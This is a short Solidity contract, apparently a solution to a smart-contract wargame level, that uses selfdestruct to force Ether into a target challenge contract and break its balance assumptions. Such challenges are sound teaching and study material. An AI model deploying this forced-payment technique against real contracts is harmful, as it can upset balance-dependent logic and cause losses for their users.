// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttacker {
    address public challengeInstance;

    constructor(address _challengeInstance) payable {
        challengeInstance = _challengeInstance;
    }

    function attack() external {
        selfdestruct(payable(challengeInstance));
    }
}